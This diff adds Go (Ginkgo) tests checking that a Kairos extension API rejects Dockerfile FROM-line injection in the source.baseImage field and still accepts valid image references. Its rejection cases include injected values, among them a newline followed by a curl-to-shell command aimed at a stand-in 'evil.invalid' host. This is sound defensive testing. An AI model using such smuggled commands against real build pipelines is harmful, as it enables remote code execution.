@@ -482,3 +482,62 @@ var _ = Describe("ExtensionHandler.Download", func() {
 		Expect(rec.Code).To(Equal(http.StatusBadRequest))
 	})
 })
+
+// kairos-io/kairos#5297: source.baseImage is written into a `FROM` line, so a
+// value carrying a newline adds instructions to a build the operator believes
+// is curated. It has to be refused with a 400 before it reaches the builder.
+var _ = Describe("ExtensionHandler.Create — source image validation", func() {
+	var (
+		e       *echo.Echo
+		fb      *fakeExtensionBuilder
+		handler *handlers.ExtensionHandler
+	)
+
+	BeforeEach(func() {
+		e = echo.New()
+		fb = &fakeExtensionBuilder{}
+		handler = handlers.NewExtensionHandler(fb, newFakeExtensionStore(), newFakeBundleStore(), nil, nil, "")
+	})
+
+	post := func(baseImage string) *httptest.ResponseRecorder {
+		body, err := json.Marshal(map[string]any{
+			"name": "x", "type": "sysext", "arch": "amd64",
+			"source": map[string]string{"mode": "image", "baseImage": baseImage},
+		})
+		Expect(err).NotTo(HaveOccurred())
+		req := httptest.NewRequest(http.MethodPost, "/api/v1/extensions", strings.NewReader(string(body)))
+		req.Header.Set("Content-Type", "application/json")
+		rec := httptest.NewRecorder()
+		c := e.NewContext(req, rec)
+		Expect(handler.Create(c)).To(Succeed())
+		return rec
+	}
+
+	DescribeTable("rejects a reference that cannot be written into a FROM line",
+		func(baseImage string) {
+			rec := post(baseImage)
+			Expect(rec.Code).To(Equal(http.StatusBadRequest))
+			Expect(rec.Body.String()).To(ContainSubstring("source.baseImage"))
+			Expect(fb.lastOpts.Name).To(BeEmpty(), "must not reach the builder")
+		},
+		Entry("newline then RUN", "ubuntu:24.04\nRUN curl http://evil.invalid/x | sh"),
+		Entry("carriage return", "ubuntu:24.04\r\nUSER root"),
+		Entry("a space", "ubuntu:24.04 AS stage"),
+		Entry("a NUL", "ubuntu:24.04\x00"),
+		Entry("not a reference at all", "UPPERCASE/repo:tag"),
+		Entry("a path on the server", "dir:/etc"),
+	)
+
+	DescribeTable("still accepts the shapes in use",
+		func(baseImage string) {
+			rec := post(baseImage)
+			Expect(rec.Code).To(Equal(http.StatusCreated))
+			Expect(fb.lastOpts.Source.BaseImage).To(Equal(baseImage), "stored as sent")
+		},
+		Entry("plain tag", "ubuntu:24.04"),
+		Entry("fully qualified", "quay.io/kairos/ubuntu:24.04-core-amd64-generic-v3.6.0"),
+		Entry("registry with a port", "localhost:5000/kairos/ubuntu:24.04"),
+		Entry("digest", "ubuntu@sha256:0000000000000000000000000000000000000000000000000000000000000000"),
+		Entry("oci source URI", "oci:quay.io/kairos/ubuntu:latest"),
+	)
+})
